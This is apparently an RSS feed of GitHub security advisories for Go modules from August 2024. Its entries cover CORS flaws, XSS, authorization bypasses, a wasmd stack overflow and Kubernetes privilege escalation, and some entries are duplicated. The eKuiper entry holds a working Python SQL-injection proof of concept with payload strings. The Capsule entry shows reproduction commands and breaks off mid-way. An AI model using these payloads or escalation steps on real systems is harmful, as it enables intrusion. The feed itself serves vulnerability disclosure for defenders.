<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-08-22T19:01:11.073Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/usememos/memos] memos CORS Misconfiguration in server.go (GHSL-2024-034)]]></title>
        <id>https://github.com/advisories/GHSA-p4fx-qf2h-jpmj</id>
        <link href="https://github.com/advisories/GHSA-p4fx-qf2h-jpmj"/>
        <updated>2024-08-22T17:18:17.000Z</updated>
        <content type="html"><![CDATA[<p>memos is a privacy-first, lightweight note-taking service. A CORS misconfiguration exists in memos 0.20.1 and earlier where an arbitrary origin is reflected with Access-Control-Allow-Credentials set to true. This may allow an attacking website to make a cross-origin request, allowing the attacker to read private information or make privileged changes to the system as the vulnerable user account.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41659">https://nvd.nist.gov/vuln/detail/CVE-2024-41659</a></li>
<li><a href="https://github.com/usememos/memos/commit/8101a5e0b162044c16385bee4f12a4a653d050b9">https://github.com/usememos/memos/commit/8101a5e0b162044c16385bee4f12a4a653d050b9</a></li>
<li><a href="https://github.com/usememos/memos/blob/v0.20.1/server/server.go#L163">https://github.com/usememos/memos/blob/v0.20.1/server/server.go#L163</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2024-034_memos">https://securitylab.github.com/advisories/GHSL-2024-034_memos</a></li>
<li><a href="https://github.com/advisories/GHSA-p4fx-qf2h-jpmj">https://github.com/advisories/GHSA-p4fx-qf2h-jpmj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p4fx-qf2h-jpmj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-22T17:18:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/casdoor/casdoor] Casdoor has reflected XSS in QrCodePage.js (GHSL-2024-036)]]></title>
        <id>https://github.com/advisories/GHSA-gv2p-4mvg-g32h</id>
        <link href="https://github.com/advisories/GHSA-gv2p-4mvg-g32h"/>
        <updated>2024-08-22T17:17:41.000Z</updated>
        <content type="html"><![CDATA[<p>Casdoor is a UI-first Identity and Access Management (IAM) / Single-Sign-On (SSO) platform.  In Casdoor 1.577.0 and earlier, he purchase URL that is created to generate a WechatPay QR code is vulnerable to reflected XSS. When purchasing an item through casdoor, the product page allows you to pay via wechat pay. When using wechat pay, a QR code with the wechat pay link is displayed on the payment page, hosted on the domain of casdoor. This page takes a query parameter from the url successUrl, and redirects the user to that url after a successful purchase. Because the user has no reason to think that the payment page contains sensitive information, they may share it with other or can be social engineered into sending it to others. An attacker can then craft the casdoor link with a special url and send it back to the user, and once payment has gone though an XSS attack occurs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41658">https://nvd.nist.gov/vuln/detail/CVE-2024-41658</a></li>
<li><a href="https://github.com/casdoor/casdoor/blob/v1.577.0/web/src/QrCodePage.js">https://github.com/casdoor/casdoor/blob/v1.577.0/web/src/QrCodePage.js</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2024-035_GHSL-2024-036_casdoor">https://securitylab.github.com/advisories/GHSL-2024-035_GHSL-2024-036_casdoor</a></li>
<li><a href="https://github.com/advisories/GHSA-gv2p-4mvg-g32h">https://github.com/advisories/GHSA-gv2p-4mvg-g32h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gv2p-4mvg-g32h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-22T17:17:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/casdoor/casdoor] Casdoor CORS misconfiguration (GHSL-2024-035)]]></title>
        <id>https://github.com/advisories/GHSA-mchx-7j67-8mcf</id>
        <link href="https://github.com/advisories/GHSA-mchx-7j67-8mcf"/>
        <updated>2024-08-22T17:16:41.000Z</updated>
        <content type="html"><![CDATA[<p>Casdoor is a UI-first Identity and Access Management (IAM) / Single-Sign-On (SSO) platform. In Casdoor 1.577.0 and earlier, a logic vulnerability exists in the beego filter CorsFilter that allows any website to make cross domain requests to Casdoor as the logged in user. Due to the a logic error in checking only for a prefix when authenticating the Origin header, any domain can create a valid subdomain with a valid subdomain prefix (Ex: localhost.example.com), allowing the website to make requests to Casdoor as the current signed-in user.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41657">https://nvd.nist.gov/vuln/detail/CVE-2024-41657</a></li>
<li><a href="https://github.com/casdoor/casdoor/blob/v1.577.0/routers/cors_filter.go#L45">https://github.com/casdoor/casdoor/blob/v1.577.0/routers/cors_filter.go#L45</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2024-035_GHSL-2024-036_casdoor">https://securitylab.github.com/advisories/GHSL-2024-035_GHSL-2024-036_casdoor</a></li>
<li><a href="https://github.com/advisories/GHSA-mchx-7j67-8mcf">https://github.com/advisories/GHSA-mchx-7j67-8mcf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mchx-7j67-8mcf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-22T17:16:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[goauthentik.io] GoAuthentik vulnerable to Insufficient Authorization for several API endpoints]]></title>
        <id>https://github.com/advisories/GHSA-qxqc-27pr-wgc8</id>
        <link href="https://github.com/advisories/GHSA-qxqc-27pr-wgc8"/>
        <updated>2024-08-22T19:00:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Several API endpoints can be accessed by users without correct authentication/authorization.</p>
<p>The main API endpoints affected by this:</p>
<ul>
<li><code>/api/v3/crypto/certificatekeypairs/&lt;uuid&gt;/view_certificate/</code></li>
<li><code>/api/v3/crypto/certificatekeypairs/&lt;uuid&gt;/view_private_key/</code></li>
<li><code>/api/v3/.../used_by/</code></li>
</ul>
<p>Note that all of the affected API endpoints require the knowledge of the ID of an object, which especially for certificates is not accessible to an unprivileged user. Additionally the IDs for most objects are UUIDv4, meaning they are not easily guessable/enumerable.</p>
<h3 id="patches">Patches</h3>
<p>authentik 2024.4.4, 2024.6.4 and 2024.8.0 fix this issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Access to the API endpoints can be blocked at a Reverse-proxy/Load balancer level to prevent this issue from being exploited.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:security@goauthentik.io">security@goauthentik.io</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/goauthentik/authentik/security/advisories/GHSA-qxqc-27pr-wgc8">https://github.com/goauthentik/authentik/security/advisories/GHSA-qxqc-27pr-wgc8</a></li>
<li><a href="https://github.com/goauthentik/authentik/commit/19318d4c00bb02c4ec3c4f8f15ac2e1dbe8d846c">https://github.com/goauthentik/authentik/commit/19318d4c00bb02c4ec3c4f8f15ac2e1dbe8d846c</a></li>
<li><a href="https://github.com/goauthentik/authentik/commit/359b343f51524342a5ca03828e7c975a1d654b11">https://github.com/goauthentik/authentik/commit/359b343f51524342a5ca03828e7c975a1d654b11</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42490">https://nvd.nist.gov/vuln/detail/CVE-2024-42490</a></li>
<li><a href="https://github.com/advisories/GHSA-qxqc-27pr-wgc8">https://github.com/advisories/GHSA-qxqc-27pr-wgc8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qxqc-27pr-wgc8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-22T16:39:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[goauthentik.io] GoAuthentik vulnerable to Insufficient Authorization for several API endpoints]]></title>
        <id>https://github.com/advisories/GHSA-qxqc-27pr-wgc8</id>
        <link href="https://github.com/advisories/GHSA-qxqc-27pr-wgc8"/>
        <updated>2024-08-22T19:00:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Several API endpoints can be accessed by users without correct authentication/authorization.</p>
<p>The main API endpoints affected by this:</p>
<ul>
<li><code>/api/v3/crypto/certificatekeypairs/&lt;uuid&gt;/view_certificate/</code></li>
<li><code>/api/v3/crypto/certificatekeypairs/&lt;uuid&gt;/view_private_key/</code></li>
<li><code>/api/v3/.../used_by/</code></li>
</ul>
<p>Note that all of the affected API endpoints require the knowledge of the ID of an object, which especially for certificates is not accessible to an unprivileged user. Additionally the IDs for most objects are UUIDv4, meaning they are not easily guessable/enumerable.</p>
<h3 id="patches">Patches</h3>
<p>authentik 2024.4.4, 2024.6.4 and 2024.8.0 fix this issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Access to the API endpoints can be blocked at a Reverse-proxy/Load balancer level to prevent this issue from being exploited.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:security@goauthentik.io">security@goauthentik.io</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/goauthentik/authentik/security/advisories/GHSA-qxqc-27pr-wgc8">https://github.com/goauthentik/authentik/security/advisories/GHSA-qxqc-27pr-wgc8</a></li>
<li><a href="https://github.com/goauthentik/authentik/commit/19318d4c00bb02c4ec3c4f8f15ac2e1dbe8d846c">https://github.com/goauthentik/authentik/commit/19318d4c00bb02c4ec3c4f8f15ac2e1dbe8d846c</a></li>
<li><a href="https://github.com/goauthentik/authentik/commit/359b343f51524342a5ca03828e7c975a1d654b11">https://github.com/goauthentik/authentik/commit/359b343f51524342a5ca03828e7c975a1d654b11</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42490">https://nvd.nist.gov/vuln/detail/CVE-2024-42490</a></li>
<li><a href="https://github.com/advisories/GHSA-qxqc-27pr-wgc8">https://github.com/advisories/GHSA-qxqc-27pr-wgc8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qxqc-27pr-wgc8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-22T16:39:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openshift/console] Openshift Console insufficient entropy vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-4crf-28c7-v4gr</id>
        <link href="https://github.com/advisories/GHSA-4crf-28c7-v4gr"/>
        <updated>2024-08-21T20:09:40.000Z</updated>
        <content type="html"><![CDATA[<p>An insufficient entropy vulnerability was found in the Openshift Console. In the authorization code type and implicit grant type, the OAuth2 protocol is vulnerable to a Cross-Site Request Forgery (CSRF) attack if the state parameter is used inefficiently. This flaw allows logging into the victim’s current application account using a third-party account without any restrictions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6508">https://nvd.nist.gov/vuln/detail/CVE-2024-6508</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-6508">https://access.redhat.com/security/cve/CVE-2024-6508</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2295777">https://bugzilla.redhat.com/show_bug.cgi?id=2295777</a></li>
<li><a href="https://github.com/advisories/GHSA-4crf-28c7-v4gr">https://github.com/advisories/GHSA-4crf-28c7-v4gr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4crf-28c7-v4gr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-21T06:32:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/CosmWasm/wasmd] CWA-2024-006: wasmd non-deterministic module_query_safe query]]></title>
        <id>https://github.com/advisories/GHSA-fpgj-cr28-fvpx</id>
        <link href="https://github.com/advisories/GHSA-fpgj-cr28-fvpx"/>
        <updated>2024-08-21T20:19:15.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Component:</strong> wasmd
<strong>Criticality:</strong> Medium (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Moderate; L:Likely)
<strong>Patched versions:</strong> wasmd 0.53.0</p>
<p>See <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-006.md">CWA-2024-006</a> for more details.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CosmWasm/wasmd/security/advisories/GHSA-fpgj-cr28-fvpx">https://github.com/CosmWasm/wasmd/security/advisories/GHSA-fpgj-cr28-fvpx</a></li>
<li><a href="https://github.com/CosmWasm/wasmd/commit/db8981db8419fc4daa042ce04e279efb53c4ff29">https://github.com/CosmWasm/wasmd/commit/db8981db8419fc4daa042ce04e279efb53c4ff29</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-006.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-006.md</a></li>
<li><a href="https://github.com/advisories/GHSA-fpgj-cr28-fvpx">https://github.com/advisories/GHSA-fpgj-cr28-fvpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fpgj-cr28-fvpx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-21T18:33:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/CosmWasm/wasmd] CWA-2024-005: Stackoverflow in wasmd]]></title>
        <id>https://github.com/advisories/GHSA-g8w7-7vgg-x7xg</id>
        <link href="https://github.com/advisories/GHSA-g8w7-7vgg-x7xg"/>
        <updated>2024-08-21T18:33:16.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Component:</strong> wasmd
<strong>Criticality:</strong> High (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Critical; L:Likely)
<strong>Patched versions:</strong> wasmd 0.53.0, 0.46.0</p>
<p>See <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-005.md">CWA-2024-005</a> for more details.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CosmWasm/wasmd/security/advisories/GHSA-g8w7-7vgg-x7xg">https://github.com/CosmWasm/wasmd/security/advisories/GHSA-g8w7-7vgg-x7xg</a></li>
<li><a href="https://github.com/CosmWasm/wasmd/commit/71cf6a8145426b82ed6249ecc86ddd281af9f97b">https://github.com/CosmWasm/wasmd/commit/71cf6a8145426b82ed6249ecc86ddd281af9f97b</a></li>
<li><a href="https://github.com/CosmWasm/wasmd/commit/db8981db8419fc4daa042ce04e279efb53c4ff29">https://github.com/CosmWasm/wasmd/commit/db8981db8419fc4daa042ce04e279efb53c4ff29</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-005.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-005.md</a></li>
<li><a href="https://github.com/advisories/GHSA-g8w7-7vgg-x7xg">https://github.com/advisories/GHSA-g8w7-7vgg-x7xg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g8w7-7vgg-x7xg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-21T18:33:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/CosmWasm/wasmd] CWA-2024-005: Stackoverflow in wasmd]]></title>
        <id>https://github.com/advisories/GHSA-g8w7-7vgg-x7xg</id>
        <link href="https://github.com/advisories/GHSA-g8w7-7vgg-x7xg"/>
        <updated>2024-08-21T18:33:16.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Component:</strong> wasmd
<strong>Criticality:</strong> High (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Critical; L:Likely)
<strong>Patched versions:</strong> wasmd 0.53.0, 0.46.0</p>
<p>See <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-005.md">CWA-2024-005</a> for more details.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CosmWasm/wasmd/security/advisories/GHSA-g8w7-7vgg-x7xg">https://github.com/CosmWasm/wasmd/security/advisories/GHSA-g8w7-7vgg-x7xg</a></li>
<li><a href="https://github.com/CosmWasm/wasmd/commit/71cf6a8145426b82ed6249ecc86ddd281af9f97b">https://github.com/CosmWasm/wasmd/commit/71cf6a8145426b82ed6249ecc86ddd281af9f97b</a></li>
<li><a href="https://github.com/CosmWasm/wasmd/commit/db8981db8419fc4daa042ce04e279efb53c4ff29">https://github.com/CosmWasm/wasmd/commit/db8981db8419fc4daa042ce04e279efb53c4ff29</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-005.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-005.md</a></li>
<li><a href="https://github.com/advisories/GHSA-g8w7-7vgg-x7xg">https://github.com/advisories/GHSA-g8w7-7vgg-x7xg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g8w7-7vgg-x7xg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-21T18:33:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/kanisterio/kanister] Kanister vulnerable to cluster-level privilege escalation]]></title>
        <id>https://github.com/advisories/GHSA-h27c-6xm3-mcqp</id>
        <link href="https://github.com/advisories/GHSA-h27c-6xm3-mcqp"/>
        <updated>2024-08-21T17:56:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="details">Details</h3>
<p>The kanister has a deployment called default-kanister-operator, which is bound with a ClusterRole called edit via ClusterRoleBinding(<a href="https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/templates/rbac.yaml#L49">https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/templates/rbac.yaml#L49</a>). The "edit" ClusterRole is one of Kubernetes default-created ClusterRole, and it have create/patch/udpate verbs of daemonset resources, create verb of serviceaccount/token resources, and impersonate verb of serviceaccounts resources. If a malicious user can access the worker node which has this component, he/she can:</p>
<p>For the create/patch/update verbs of daemonset resources, the malicious user can abuse it to create or modify a set of Pods to mount a high-privilege service account (e.g., the cluster-admin service account). After that, he/she can abuse the high-privilege SA token of created Pod to take over the whole cluster.</p>
<p>For the create verb of serviceaccount/token resources, a malicious user can abuse this permission to generate new Service Account tokens and use them to operate with high-privilege roles, such as cluster administrators. These tokens can be used to access and manipulate any resources within the cluster.</p>
<p>For the impersonate verb of serviceaccounts resources, a malicious user can impersonate high-privilege Service Accounts, thereby gaining access to roles such as cluster administrators. This enables the attacker to perform all actions that the high-privilege account can, including creating, modifying, and deleting critical resources within the cluster.</p>
<h3 id="poc">PoC</h3>
<p>We have discussed in the "Details" section</p>
<h3 id="impact">Impact</h3>
<p>Privilege escalation</p>
<h3 id="mitigation">Mitigation</h3>
<p>Currently kanister helm chart provides rbac.create flag (true by default), which controls whether the rbac rules for kanister service account will be created <a href="https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/values.yaml#L17">https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/values.yaml#L17</a>
If this value set to false, the user needs to create rbac rules themselves and they can limit the role bindings for kanister service account, for example scope it to specific namespace.
Service account can also be configured via helm <a href="https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/values.yaml#L19">https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/values.yaml#L19</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kanisterio/kanister/security/advisories/GHSA-h27c-6xm3-mcqp">https://github.com/kanisterio/kanister/security/advisories/GHSA-h27c-6xm3-mcqp</a></li>
<li><a href="https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/templates/rbac.yaml#L49">https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/templates/rbac.yaml#L49</a></li>
<li><a href="https://github.com/kanisterio/kanister/wiki/2023%E2%80%9024-Community-Meeting-Notes">https://github.com/kanisterio/kanister/wiki/2023%E2%80%9024-Community-Meeting-Notes</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43403">https://nvd.nist.gov/vuln/detail/CVE-2024-43403</a></li>
<li><a href="https://github.com/advisories/GHSA-h27c-6xm3-mcqp">https://github.com/advisories/GHSA-h27c-6xm3-mcqp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h27c-6xm3-mcqp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-20T22:13:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana plugin data sources vulnerable to access control bypass]]></title>
        <id>https://github.com/advisories/GHSA-hh8p-374f-qgr5</id>
        <link href="https://github.com/advisories/GHSA-hh8p-374f-qgr5"/>
        <updated>2024-08-20T20:04:55.000Z</updated>
        <content type="html"><![CDATA[<p>Access control for plugin data sources protected by the ReqActions json field of the plugin.json is bypassed if the user or service account is granted associated access to any other data source, as the ReqActions check was not scoped to each specific datasource. The account must have prior query access to the impacted datasource.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6322">https://nvd.nist.gov/vuln/detail/CVE-2024-6322</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-6322">https://grafana.com/security/security-advisories/cve-2024-6322</a></li>
<li><a href="https://github.com/grafana/grafana/commit/4cb3ba5d1a7ab8b9676034e89dada2fcde1766ef">https://github.com/grafana/grafana/commit/4cb3ba5d1a7ab8b9676034e89dada2fcde1766ef</a></li>
<li><a href="https://github.com/grafana/grafana/commit/9cdba084a9100c6b11d32eef9d2bd53656c6964a">https://github.com/grafana/grafana/commit/9cdba084a9100c6b11d32eef9d2bd53656c6964a</a></li>
<li><a href="https://github.com/advisories/GHSA-hh8p-374f-qgr5">https://github.com/advisories/GHSA-hh8p-374f-qgr5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hh8p-374f-qgr5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-20T18:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana plugin data sources vulnerable to access control bypass]]></title>
        <id>https://github.com/advisories/GHSA-hh8p-374f-qgr5</id>
        <link href="https://github.com/advisories/GHSA-hh8p-374f-qgr5"/>
        <updated>2024-08-20T20:04:55.000Z</updated>
        <content type="html"><![CDATA[<p>Access control for plugin data sources protected by the ReqActions json field of the plugin.json is bypassed if the user or service account is granted associated access to any other data source, as the ReqActions check was not scoped to each specific datasource. The account must have prior query access to the impacted datasource.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6322">https://nvd.nist.gov/vuln/detail/CVE-2024-6322</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-6322">https://grafana.com/security/security-advisories/cve-2024-6322</a></li>
<li><a href="https://github.com/grafana/grafana/commit/4cb3ba5d1a7ab8b9676034e89dada2fcde1766ef">https://github.com/grafana/grafana/commit/4cb3ba5d1a7ab8b9676034e89dada2fcde1766ef</a></li>
<li><a href="https://github.com/grafana/grafana/commit/9cdba084a9100c6b11d32eef9d2bd53656c6964a">https://github.com/grafana/grafana/commit/9cdba084a9100c6b11d32eef9d2bd53656c6964a</a></li>
<li><a href="https://github.com/advisories/GHSA-hh8p-374f-qgr5">https://github.com/advisories/GHSA-hh8p-374f-qgr5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hh8p-374f-qgr5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-20T18:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lf-edge/ekuiper] LF Edge eKuiper has a SQL Injection in sqlKvStore]]></title>
        <id>https://github.com/advisories/GHSA-r5ph-4jxm-6j9p</id>
        <link href="https://github.com/advisories/GHSA-r5ph-4jxm-6j9p"/>
        <updated>2024-08-20T20:04:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A user could utilize and exploit SQL Injection to allow the execution of malicious SQL query via Get method in sqlKvStore. </p>
<h3 id="details">Details</h3>
<p>I will use explainRuleHandler ("/rules/{name}/explain") as an example to illustrate. However, this vulnerability also exists in other methods such as sourceManageHandler, asyncTaskCancelHandler, pluginHandler, etc.</p>
<p>The SQL injection can happen in the code:
<a href="https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/pkg/store/sql/sqlKv.go#L89-L93">https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/pkg/store/sql/sqlKv.go#L89-L93</a>
The code to accept user input is:
<a href="https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/server/rest.go#L274-L277">https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/server/rest.go#L274-L277</a></p>
<p>The rule id in the above code can be used to exploit SQL query.</p>
<p>Note that the delete function is also vulnerable:
<a href="https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/pkg/store/sql/sqlKv.go#L138-L141">https://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/pkg/store/sql/sqlKv.go#L138-L141</a></p>
<h3 id="poc">PoC</h3>
<pre><code>import requests
from urllib.parse import quote

# SELECT val FROM 'xxx' WHERE key='%s';
payload = f"""'; ATTACH DATABASE 'test93' AS test93;
CREATE TABLE test93.pwn (dataz text);
INSERT INTO test93.pwn (dataz) VALUES ("sql injection");--"""

#payload = "deadbeef'; SELECT 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))));--"

url = f"http://127.0.0.1:9081/rules/{quote(payload,safe='')}/explain"   # explainRuleHandler

res = requests.get(url)
print(res.content)
</code></pre>
<p>The screenshot shows the malicious SQL query to insert a value:
<img alt="image" src="https://github.com/user-attachments/assets/baf035cc-a561-4909-8d1f-e455e75375cb"></p>
<p>The screenshot shows the breakpoint of executing the query:
<img alt="image" src="https://github.com/user-attachments/assets/b9c29945-a0cc-4271-bdc8-c1bddfda5b6f"></p>
<h3 id="impact">Impact</h3>
<p>SQL Injection vulnerability</p>
<p>The reporters are Yuan Luo, Shuai Xiong, Haoyu Wang from Tencent YunDing Security Lab.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lf-edge/ekuiper/security/advisories/GHSA-r5ph-4jxm-6j9p">https://github.com/lf-edge/ekuiper/security/advisories/GHSA-r5ph-4jxm-6j9p</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43406">https://nvd.nist.gov/vuln/detail/CVE-2024-43406</a></li>
<li><a href="https://github.com/lf-edge/ekuiper/commit/1a9c745649438feaac357d282959687012b65503">https://github.com/lf-edge/ekuiper/commit/1a9c745649438feaac357d282959687012b65503</a></li>
<li><a href="https://github.com/advisories/GHSA-r5ph-4jxm-6j9p">https://github.com/advisories/GHSA-r5ph-4jxm-6j9p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r5ph-4jxm-6j9p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-20T20:04:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/projectcapsule/capsule] Capsule tenant owner with "patch namespace" permission can hijack system namespaces]]></title>
        <id>https://github.com/advisories/GHSA-mq69-4j5w-3qwp</id>
        <link href="https://github.com/advisories/GHSA-mq69-4j5w-3qwp"/>
        <updated>2024-08-21T18:58:57.000Z</updated>
        <content type="html"><![CDATA[<h1 id="attack-vector">Attack Vector</h1>
<p>Then, let me briefly explain the reasons for the errors mentioned above: 1. The 'kubectl edit' command was used to patch the namespace, but this operation requires both 'get' and 'patch' permissions, hence the error. One should use methods like 'curl' to directly send a PATCH request; 2. The webhook does not intercept patch operations on 'kube-system' because 'kube-system' does not have an ownerReference.</p>
<h1 id="below-are-my-detailed-reproduction-steps">Below are my detailed reproduction steps</h1>
<ol>
<li>Create a test cluster
<code>kind create cluster --image=kindest/node:v1.24.15 --name=k8s</code></li>
<li>Install the capsule
<code>helm install capsule projectcapsule/capsule -n capsule-system --create-namespace</code></li>
<li>Create a tenant</li>
</ol>
<pre><code>kubectl create -f - &lt;&lt; EOF
apiVersion: capsule.clastix.io/v1beta2
kind: Tenant
metadata:
